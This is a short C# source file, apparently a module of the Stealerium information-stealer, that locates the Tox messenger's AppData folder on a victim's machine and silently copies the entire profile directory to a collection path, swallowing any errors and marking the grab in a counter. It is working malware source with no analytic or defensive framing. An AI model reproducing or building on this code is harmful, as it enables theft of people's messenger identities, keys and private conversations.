using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Tox
{
	private static readonly string ToxPath = Path.Combine(Paths.Appdata, "Tox");

	public static void GetSession(string sSavePath)
	{
		if (Directory.Exists(ToxPath))
		{
			try
			{
				Filemanager.CopyDirectory(ToxPath, sSavePath);
			}
			catch
			{
			}
			Counter.Tox = true;
		}
	}
}
